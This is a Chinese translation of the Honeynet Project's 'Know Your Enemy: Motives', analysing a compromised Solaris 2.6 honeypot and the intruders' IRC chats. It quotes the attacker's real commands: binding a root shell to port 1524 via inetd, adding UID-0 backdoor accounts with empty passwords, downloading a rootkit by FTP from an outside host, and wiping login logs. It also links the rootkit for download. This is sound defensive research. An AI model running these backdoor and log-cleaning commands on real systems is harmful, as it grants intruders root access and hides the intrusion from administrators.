---
title: "了解你的敌人：动机"
date: 2000-06-27T00:00:00+08:00
tags: ["Security", "Translation"]
draft: false
slug: "xfocus-honeynet-motives"
---

> 本文是 Honeynet Project 的"了解你的敌人：动机"系列文章的中文翻译，原文发布于 [project.honeynet.org](http://project.honeynet.org/)，中文翻译来自 [xfocus.net](http://www.xfocus.net/)。

该篇文章是<Know Your
Enemy>系列之一，该系列主要介绍黑客社团使用的工具和策略。该文章不像该系列其他的文章主要介绍黑客社团怎样怎样、特别是他们使用的技术和工具的实现，而是分析他们的动机和心理。第一部分介绍一台Solaris
2.6系统被入侵，第二部分所提到的很少有相关信息发布，介绍在黑客入侵系统后14天内在“蜜罐”中的通话和行动记录，通过这些信息我们可以了解他们为什么和怎样攻击计算机系统。在入侵后，他们紧接着在系统中放置了一个IRC
bot，这个东西是由黑客们所配置和实现的，用来抓取在IRC频道中的所有聊天记录。我们在这两个星期当中一直监视这些记录，所有的信息都罗列在下面。这篇文章并不是要对整个黑客社团的行为作一个概括，相反，我们通过在事件当中一些个体行为的介绍，来给大家一些提示”他们当中某些人怎样想和怎样做“，这也是我们在安全领域所面对的一些普通现象，我们真诚的希望其他安全人员能够从中受益。

下面的所有信息是通过"honeynet"得到的。"honeynet"，顾名思义，就是由网络上大量的"蜜罐"所组成，"蜜罐"最简单的定义就是通过精心设计的将被黑客社团所攻击的目标主机。一些"蜜罐"是用来分散攻击者攻击真正主机的注意力，另外一些是用来学习攻击者所使用的工具和策略的，我们这里所提到是属于后者。在本文中提到的很多信息被做了一些修改，特别是用户名和口令、信用卡号、以及很多主机名，其他如确切技术细节、工具以及聊天记录我们并没有作修改。所有信息在被发布之前都已经递交给CERT和FBI，同时对于哪些我们确信遭受入侵的系统，大约发了370份通告给它们的管理员。

**[Foreword](http://www.xfocus.net/honeynet/papers/motives/forward.html)**, by Brad Powell

**第一部分：入侵 **

我们这里使用的"蜜罐"是缺省安装的Solaris 2.6系统，没有任何修改和安装补丁程序。在此讨论的漏洞在任何缺省安装没有使用补丁程序的Solaris
2.6系统上都存在。这也是整个"蜜罐"的设计意图，在系统上布置漏洞并学习它是如何被攻破的。在被攻击过程中，我们可以学习黑客社团所使用的工具和策略。同时"蜜罐"本身也被设计跟踪黑客的每一步行为。

在2000年6月4日，我们的缺省安装Solaris 2.6的"蜜罐"遭受到针对rpc.ttdbserv漏洞的攻击，该漏洞允许在ToolTalk
对象数据库服务上通过溢出远程执行代码(见CVE-1999-0003)。该漏洞在SANS组织的TOP 10上名列第三。我们使用基于sniffer的免费IDS系统Snort检测到该攻击的。

Jun 4 11:37:58 lisa snort[5894]:
[IDS241/rpc.ttdbserv-solaris-kill:](http://dev.whitehats.com/IDS/241)
192.168.78.12:877 -> 172.16.1.107:32775

rpc.ttdbserv漏洞允许远程用户通过缓冲溢出攻击在目标系统上以root权限执行任意命令。下面是攻击者在攻击成功后，在系统上安装后门，具体如下所示：攻击者在'/tmp/bob'文件中加上ingreslock服务(在/etc/service预定义的，端口1524)，然后以改文件作为配置文件重新启动inetd，这样/bin/sh被以root权限帮定在1524端口，给予了远程用户root存取权限。

/bin/ksh -c echo 'ingreslock
stream tcp nowait root /bin/sh sh -i' >>/tmp/bob ; /usr/sbin/inetd -s /tmp/bob.

当黑客安装了后门，他紧接着连接到1524端口，作为root获得一个shell，并开始执行如下命令。他增加了两个系统用户帐号，以便以后可以telnet上来，注意这里的错误和";"控制字符(因为1524端口的shell没有正确的环境)。

# cp /etc/passwd /etc/.tp;

^Mcp /etc/shadow /etc/.ts;

echo "r:x:0:0:User:/:/sbin/sh"
>> /etc/passwd;

echo "re:x:500:1000:daemon:/:/sbin/sh"
>> /etc/passwd;

echo "r::10891::::::"
>> /etc/shadow;

echo "re::6445::::::"
>> /etc/shadow;

: not found

# ^M: not found

# ^M: not found

# ^M: not found

# ^M: not found

# ^M: not found

# who;

rsides    
console      May 24 21:09

^M: not found

# exit;

此时，攻击者在我们系统上拥有了两个帐号，他可以以're'用户telnet上来，并可以通过su成UID为0的'r'用户来获得系统root权限。我们将回顾一下攻击者当时以及后来的击键记录。

 !"' !"P#$#$'LINUX'

SunOS 5.6

login: re

Choose a new password.

New password: abcdef

Re-enter new password:
abcdef

telnet (SYSTEM): passwd
successfully changed for re

Sun Microsystems Inc.  
SunOS 5.6       Generic August 1997

$ su r

现在黑客拥有了root权限，一般来首，下一步要做的就是安装一些rootkit并控制系统。首先我们看到黑客在系统上产生一个隐藏目录来隐藏他的工具包。

# mkdir /dev/".. "

# cd /dev/".. "

在产生隐藏目录后，黑客开始从其他机器上存取rootkit。

# ftp shell.example.net

Connected to shell.example.net.

220 shell.example.net
FTP server (Version 6.00) ready.

Name (shell.example.net:re):
j4n3

331 Password required
for j4n3.

Password:abcdef

230 User j4n3 logged
in.

ftp> get sun2.tar

200 PORT command successful.

150 Opening ASCII mode
data connection for 'sun2.tar' (1720320 bytes).

226 Transfer complete.

local: sun2.tar remote:
sun2.tar

1727580 bytes received
in 2.4e+02 seconds (6.90 Kbytes/s)

ftp> get l0gin

200 PORT command successful.

150 Opening ASCII mode
data connection for 'l0gin' (47165 bytes).

226 Transfer complete.

226 Transfer complete.

local: l0gin remote:
l0gin

47378 bytes received
in 7.7 seconds (6.04 Kbytes/s)

ftp> quit

U221 Goodbye.

一旦rootkit被成功下载，该工具包被解开并被安装。注意整个安装过程只执行了一个简单的脚本 [setup.sh](http://www.xfocus.net/honeynet/papers/motives/setup.txt)，这个脚本调用另外一个脚本
[secure.sh](http://www.xfocus.net/honeynet/papers/motives/secure.txt)。你也可以下载在这里使用整个[Solaris
rootkit](http://www.xfocus.net/honeynet/papers/motives/sun2.rootkit.tar.gz)。

# tar -xvf sun2.tar

x sun2, 0 bytes, 0 tape
blocks

x sun2/me, 859600 bytes,
1679 tape blocks

x sun2/ls, 41708 bytes,
82 tape blocks

x sun2/netstat, 6784
bytes, 14 tape blocks

x sun2/tcpd, 19248 bytes,
38 tape blocks

x sun2/setup.sh, 1962
bytes, 4 tape blocks

x sun2/ps, 35708 bytes,
70 tape blocks

x sun2/packet, 0 bytes,
0 tape blocks

x sun2/packet/sunst,
9760 bytes, 20 tape blocks

x sun2/packet/bc, 9782
bytes, 20 tape blocks

x sun2/packet/sm, 32664
bytes, 64 tape blocks

x sun2/packet/newbc.txt,
762 bytes, 2 tape blocks

x sun2/packet/syn, 10488
bytes, 21 tape blocks

x sun2/packet/s1, 12708
bytes, 25 tape blocks

x sun2/packet/sls, 19996
bytes, 40 tape blocks

x sun2/packet/smaq,
10208 bytes, 20 tape blocks

x sun2/packet/udp.s,
10720 bytes, 21 tape blocks

x sun2/packet/bfile,
2875 bytes, 6 tape blocks

x sun2/packet/bfile2,
3036 bytes, 6 tape blocks

x sun2/packet/bfile3,
20118 bytes, 40 tape blocks

x sun2/packet/sunsmurf,
11520 bytes, 23 tape blocks

x sun2/sys222, 34572
bytes, 68 tape blocks

x sun2/m, 9288 bytes,
19 tape blocks

x sun2/l0gin, 47165
bytes, 93 tape blocks

x sun2/sec, 1139 bytes,
3 tape blocks

x sun2/pico, 222608
bytes, 435 tape blocks

x sun2/sl4, 28008 bytes,
55 tape blocks

x sun2/fix, 10360 bytes,
21 tape blocks

x sun2/bot2, 508 bytes,
1 tape blocks

x sun2/sys222.conf,
42 bytes, 1 tape blocks

x sun2/le, 21184 bytes,
42 tape blocks

x sun2/find, 6792 bytes,
14 tape blocks

x sun2/bd2, 9608 bytes,
19 tape blocks

x sun2/snif, 16412 bytes,
33 tape blocks

x sun2/secure.sh, 1555
bytes, 4 tape blocks

x sun2/log, 47165 bytes,
93 tape blocks

x sun2/check, 46444
bytes, 91 tape blocks

x sun2/zap3, 13496 bytes,
27 tape blocks

x sun2/idrun, 188 bytes,
1 tape blocks

x sun2/idsol, 15180
bytes, 30 tape blocks

x sun2/sniff-10mb, 16488
bytes, 33 tape blocks

x sun2/sniff-100mb,
16496 bytes, 33 tape blocks

# rm sun2.tar

# mv l0gin sun2

#cd sun2

#./setup.sh

hax0r w1th K1dd13

Ok This thing is complete
:-)

这里rootkit安装脚本第一次清理和攻击者行为相关的日志文件信息。

- WTMP:

/var/adm/wtmp is Sun
Jun  4 11:47:39 2000

/usr/adm/wtmp is Sun
Jun  4 11:47:39 2000

/etc/wtmp is Sun Jun 
4 11:47:39 2000

/var/log/wtmp cannot
open

WTMP = /var/adm/wtmp

Removing user re at
pos: 1440

Done!

- UTMP:

/var/adm/utmp is Sun
Jun  4 11:47:39 2000

/usr/adm/utmp is Sun
Jun  4 11:47:39 2000

/etc/utmp is Sun Jun 
4 11:47:39 2000

/var/log/utmp cannot
open

/var/run/utmp cannot
open

UTMP = /var/adm/utmp

Removing user re at
pos: 288

Done!

- LASTLOG:

/var/adm/lastlog is
Sun Jun  4 11:47:39 2000

/usr/adm/lastlog is
Sun Jun  4 11:47:39 2000

/etc/lastlog cannot
open

/var/log/lastlog cannot
open

LASTLOG = /var/adm/lastlog

User re has no wtmp
record. Zeroing lastlog..

- WTMPX:

/var/adm/wtmpx is Sun
Jun  4 11:47:39 2000

/usr/adm/wtmpx is Sun
Jun  4 11:47:39 2000

/etc/wtmpx is Sun Jun 
4 11:47:39 2000

/var/log/wtmpx cannot
open

WTMPX = /var/adm/wtmpx

Done!

- UTMPX:

/var/adm/utmpx is Sun
Jun  4 11:47:39 2000

/usr/adm/utmpx is Sun
Jun  4 11:47:39 2000

/etc/utmpx is Sun Jun 
4 11:47:39 2000

/var/log/utmpx cannot
open

/var/run/utmpx cannot
open

UTMPX = /var/adm/utmpx

Done!

./setup.sh: ./zap: not
found

在清理完日志系统后，下一步是加固我们的系统(他们多好啊)。因为他们可以轻松的入侵，别人也可以，他们并不想让别人滥用他们的成果。

./secure.sh: rpc.ttdb=:
not found

#: securing.

#: 1) changing modes
on local files.

#: will add more local
security later.

#: 2) remote crap like
rpc.status , nlockmgr etc..

./secure.sh: usage:
kill [ [ -sig ] id ... | -l ]

./secure.sh: usage:
kill [ [ -sig ] id ... | -l ]

#: 3) killed statd ,
rpcbind , nlockmgr

#: 4) removing them
so they ever start again!

5) secured.

   207 ?       
0:00 inetd

 11467 ?       
0:00 inetd

cp: cannot access /dev/..
/sun/bot2

kill these processes@!#!@#!

cp: cannot access lpq

./setup.sh: /dev/ttyt/idrun:
cannot execute

下一步，一个IRC proxy开始运行，在这里比较迷惑的是随后脚本杀死了该进程，我也不太明白了。

Irc Proxy v2.6.4 GNU
project (C) 1998-99

Coded by James Seter
:bugs-> (Pharos@refract.com) or IRC pharos on efnet

--Using conf file ./sys222.conf

--Configuration:

    Daemon
port......:9879

    Maxusers.........:0

    Default
conn port:6667

    Pid
File.........:./pid.sys222

    Vhost
Default....:-SYSTEM DEFAULT-

    Process
Id.......:11599

Exit ./sys222{7} :Successfully
went into the background.

随后做了更多的修改，包括拷贝后门程序，包括/bin/login、/bin/ls、/usr/sbin/netstat，以及/bin/ps，而这些在脚本的输出中并看不到。强烈建议你看一下[setup.sh](http://www.xfocus.net/honeynet/papers/motives/setup.txt)和[secure.sh](http://www.xfocus.net/honeynet/papers/motives/secure.txt)的源码，看到底发生了什么事，说不定一天你不得不查看已经被类似的工具控制的系统。

# kill -9 11467

# ps -u root |grep |grep
inetd inetd

   207 ?       
0:00 inetd

# ..U/secure.sh/secure.sh

./secure.sh: rpc.ttdb=:
not found

#: securing.

#: 1) changing modes
on local files.

#: will add more local
security later.

#: 2) remote crap like
rpc.status , nlockmgr etc..

./secure.sh: usage:
kill [ [ -sig ] id ... | -l ]

./secure.sh: usage:
kill [ [ -sig ] id ... | -l ]

./secure.sh: usage:
kill [ [ -sig ] id ... | -l ]

./secure.sh: usage:
kill [ [ -sig ] id ... | -l ]

#: 3) killed statd ,
rpcbind , nlockmgr

#: 4) removing them
so they ever start again!

5) secured.

# ppUs -u s -u U||U
grep  grep ttUtdbtdb

Ups: option requires
an argument -- u

usage: ps [ -aAdeflcj
] [ -o format ] [ -t termlist ]

       
[ -u userlist ] [ -U userlist ] [ -G grouplist ]

       
[ -p proclist ] [ -g pgrplist ] [ -s sidlist ]

  'format' is one
or more of:

       
user ruser group rgroup uid ruid gid rgid pid ppid pgid sid

       
pri opri pcpu pmem vsz rss osz nice class time etime stime

       
f s c tty addr wchan fname comm args

# ppUs -s -UAdj | grep
ttdbAdj | grep ttdb

最后，攻击者运行了IRC bot，该程序是为了保证他们能够按照自己的意愿控制该IRC频道，同时它也记录IRC频道全部的聊天记录，也正是通过他们安装的bot，我们得到了他们的所有聊天记录。

# ../me -f bot2

init: Using config file:
bot2

EnergyMech 2.7.1, December
2nd, 1999

Starglider Class EnergyMech

Compiled on Jan 27 2000
07:06:04

Features: DYN, NEW,
SEF

init: Unknown configuration
item: "NOSEEN" (ignored)

init: Mechs added [
save2 ]

init: Warning: save2
has no userlist, running in setup mode

init: EnergyMech running...

# exit;

$ exit

当安置好bot后，黑客离开了系统，正是这个bot捕获了他们的所有对话(见下面第二部分)。如果想得到更多的关于IRC和黑客社团如何利用IRC和bot，可以参考David
Brumley的<[Tracking Hackers
on IRC](http://theorygroup.com/Theory/irc.html)>。在以后的几周里，为了确认仍然控制着系统他们又登上系统几次。一周后，6月11日，他们再次连接过来尝试使用该系统进行拒绝服务攻击。当然，该"蜜罐"设计时已经考虑到阻塞所有使用它作为对外攻击的基地的尝试。所有使用该系统进行拒绝服务攻击的尝试都会被阻塞掉。

我们在这里所看到的是很普通的现象：黑客社团使用的工具和策略，他们根据已知的漏洞随机扫描Internet(在该案例中是rpc.ttdbserv)，一旦发现，他们会很快的入侵系统并使用脚本工具安装后门，一旦控制了系统，他们会安装bot以确保他们控制着IRC频道。这里唯一不一般的是他们的bot为我们所捕获的聊天信息。在本文的下一部分我们将以他们的聊天记录分析他们的动机和心理。如果你怀疑你的系统已经被相同的方法入侵，可以参考[checklist](http://www.xfocus.net/honeynet/papers/motives/check.txt)，它包括了怎样检查被入侵系统相关信息。

**第二部分: IRC聊天记录 

**

下面是他们的聊天记录，其中两个人我们暂且叫做D1ck和J4n3，他们开通的频道也暂且叫做K1dd13。你将会看到这两个人的行为，当然还有其他一些人。聊天记录我们按天分，罗列在下面。我们建议你按顺序读，这样就会明白发生的事。这里所提到的IRC频道、系统名称、IP地址都做了相应修改，所有系统的IP地址已经RFC
1918里的非公用IP替代，域名被换成"example"，所有提到的信用卡号被换成"xxxx"。如果IRC频道名相同，纯属巧合。经过仔细考虑，我们没有过滤掉其中的谩骂的字眼，他们所提到的一些外语，我们也尽可能的翻译成英语。当你仔细读他们聊天记录时，你会发现他们缺乏网络技巧和知识，经常会看到他们尝试学习Unix的基本技巧，但是就是他们仍然能够入侵破坏大量的系统，这些决不是危言耸听。

 

- [Day 1, June
04](http://www.xfocus.net/honeynet/papers/motives/day1.txt)

开始讨论建立一个攻击程序结构并共享用来攻击潜在目标的攻击程序。

- [Day 2, June
05](http://www.xfocus.net/honeynet/papers/motives/day2.txt)

今天D1ck和J4n3共享攻击程序和拒绝服务攻击。注意他们吹牛已经攻破了多少网络，似乎其中一个正在教育网上搜寻Linux主机。同时他们讨论了在Linux和sparc上使用新的rootkit。

- [Day 3, June
06](http://www.xfocus.net/honeynet/papers/motives/day3.txt)

D1ck和J4n3吹嘘那些他们已经对其进行拒绝服务攻击地系统，稍后，D1ck教给J4n3如何mount一个设备。最后讨论了sniffer(关于如何使用)，似乎D1ck在拼命寻找Irix主机的攻击程序和rootkit。

- [Day 4, June
07](http://www.xfocus.net/honeynet/papers/motives/day4.txt)

D1ck和J4n3决定对印度采取决绝服务攻击和针对bind的攻击。稍后，他们对那些激怒他们的IRC成员进行拒绝服务攻击。

- [Day 5, June
08](http://www.xfocus.net/honeynet/papers/motives/day5.txt)

D1ck请求J4n3为他入侵三个系统。D1ck和他的密友Sp07想研究一下sniffer是怎样工作的，包括"是否需要在同一网段上运行"等问题。

- [Day 6, June
09](http://www.xfocus.net/honeynet/papers/motives/day6.txt)

这支奇特的队伍开始忙碌起来，似乎D1ck已经入侵了40个系统。我们有理由相信：如果他们可以扫描足够多的系统，那么就会有更多的系统遭受入侵。

- [Day 7, June
10](http://www.xfocus.net/honeynet/papers/motives/day7.txt)

平淡的一天，D1ck教一个新兵k1dd13如何使用针对sadmind的攻击程序，我们不确定D1ck是否自己会使用。

- [Day 8, June
11](http://www.xfocus.net/honeynet/papers/motives/day8.txt)

D1ck和J4n3讨论他们拥有的系统和那些他们想对其进行拒绝服务的人们，D1ck发现了Ping of Death。

- [Day 9, June
12](http://www.xfocus.net/honeynet/papers/motives/day9.txt)

似乎D1ck撞了大运，他发现了一个ISP并且获得了超过5000个用户帐号，现在他们不得不想如何crack这些帐号。

- [Day 10,
June 13](http://www.xfocus.net/honeynet/papers/motives/day10.txt)

Sp07加入这个团体，似乎他也不太喜欢印度。

- [Day 11,
June 14](http://www.xfocus.net/honeynet/papers/motives/day11.txt)

他们开始crack用户密码并存取用户帐号。

- [Day 12,
June 15](http://www.xfocus.net/honeynet/papers/motives/day12.txt) Also with [罗马尼亚译文](http://www.xfocus.net/honeynet/papers/motives/day12-rom.txt)

D1ck和J4n3开始尝试在信用卡频道里搜寻信用卡号，成功的话，他们可以购买更多的域名

- [Day 13,
June 16](http://www.xfocus.net/honeynet/papers/motives/day13.txt) Also with [罗马尼亚译文](http://www.xfocus.net/honeynet/papers/motives/day13-rom.txt)

D1ck和J4n3仍然在信用卡频道里搜寻。他们交换信用卡、分享帐号以及色情站点，最后他们把重点放在自己的Web站点。 

- [Day 14, June
17](http://www.xfocus.net/honeynet/papers/motives/day14.txt) Also with [罗马尼亚译文](http://www.xfocus.net/honeynet/papers/motives/day14-rom.txt)

D1ck和J4n3讨论如何获取Linux主机帐号，并谈论了很多关于信用卡，然后继续构建Web站点。

我们已经回顾了这个黑客社团在14天当中的生活，当让这些并不意味着所有的黑客都是如此想和行动。我们只是关注了一些个别的特殊的团体。但是我们仍然希望通过这些信息能够给你些提示：他们的能力如何，他们或许并不是技术高手，甚至不明白他们正在使用的工具。但是，通过对很多系统的攻击，最终取得了戏剧性的结果，这些不是危言耸听。他们不关心所造成的后果有多严重，他们只关心自己达到了目标。

**结论**

本文的意图就是要使你明确黑客社团的行为和心理。从一开始的一台Solaris 2.6"蜜罐"遭受入侵开始，证实了一个使用普通的远程溢出攻击程序攻击存在漏洞的系统，一旦遭受入侵，系统很快就会被在黑客社团中普遍使用的工具包rootkit所控制。这些可能都很普通，但是本文的一个特点就是让你观察到黑客的思想行为，你可以看到他们所想的和实际行为以及所说的每一句话，特别是如何攻击和破坏系统，他们随机的扫描大量的系统并攻击那些在他们看来存在漏洞的系统。通过理解他们那的行为和思想，你可以更好的保护你的系统免受类似攻击。

**感谢**

此篇文章是Honeynet项目的工作和研究结果，[Honeynet](http://projects.honeynet.org/)项目小组是由一些安全专业人士组成，致力于研究黑客社团使用的工具和策略、并把这些知识和经验与安全社团人士分享的组织。

我们应该感谢[SANS](http://www.sans.org/)的Alan Paller，尽管并不是Honeynet项目的成员，他帮助我们实现了这个研究。
